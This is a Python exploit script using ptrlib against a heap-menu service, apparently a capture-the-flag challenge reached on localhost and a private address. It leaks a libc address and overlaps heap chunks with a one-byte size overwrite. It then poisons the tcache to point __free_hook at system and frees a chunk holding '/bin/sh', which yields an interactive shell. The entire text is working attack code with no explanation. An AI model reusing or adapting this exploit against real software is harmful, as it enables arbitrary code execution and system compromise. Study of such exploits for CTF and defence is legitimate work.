from ptrlib import *

def add(size, phone, name, desc):
    sock.recvuntil("> ")
    sock.sendline("1")
    sock.recvuntil("Description Length: ")
    sock.sendline(str(size))
    sock.recvuntil("Phone Number: ")
    sock.sendline(str(phone))
    sock.recvuntil("Name: ")
    sock.send(name)
    sock.recvuntil("Description: ")
    sock.send(desc)
    sock.recvuntil("index=")
    i = int(sock.recvline().rstrip())
    return i

def show(index):
    sock.recvuntil("> ")
    sock.sendline("2")
    sock.recvuntil("Index: ")
    sock.sendline(str(index))
    sock.recvuntil(": ")
    phone = int(sock.recvline().rstrip())
    sock.recvuntil(": ")
    name = sock.recvline().rstrip()
    sock.recvuntil(": ")
    desc = sock.recvline().rstrip()
    return phone, name, desc

def delete(index):
    sock.recvuntil("> ")
    sock.sendline("3")
    sock.recvuntil("Index: ")
    sock.sendline(str(index))

libc = ELF("./libc-2.26.so")
sock = Socket("127.0.0.1", 9000)
libc_main_arena = 0x3dac20
delta = 8
#libc = ELF("./libc-2.27.so")
#sock = Socket("192.168.128.106", 9000)
#libc_main_arena = 0x3ebc40
#delta = 0

# Leak libc
add(0x1000, 1234, "John", "A") # 0
add(0x28, 1234, "John", "B") # 1
add(0x58, 1234, "John", "C") # 2
add(0x28, 1234, "John", "D") # 3
add(0x28, 1234, "John", "E") # 4
add(0x58, 1234, "John", "F") # 5
delete(0)
add(0x28, 1234, "John", "XXXXXXXX") # 0
phone, name, desc = show(0)
addr = u64(desc[8:])
libc_base = addr - libc_main_arena - 1664 + delta
addr_free_hook = libc_base + libc.symbol("__free_hook")
addr_system = libc_base + libc.symbol("system")
dump("libc base = " + hex(libc_base))

# Overlap
delete(4)
delete(3)
delete(1)
delete(5)
add(0x28, 1234, "John", "\x00" * 0x28 + "\x81") # 1
delete(2)
payload = b"\x00" * 0x28
payload += p64(0x61)
payload += p64(addr_free_hook)

_ = input()
add(0x78, 1234, "John", payload)

# TCache Poisoning
add(0x58, 1234, "John", "P")
i = add(0x58, 1234, "/bin/sh\x00", p64(addr_system))
delete(i)

sock.interactive()
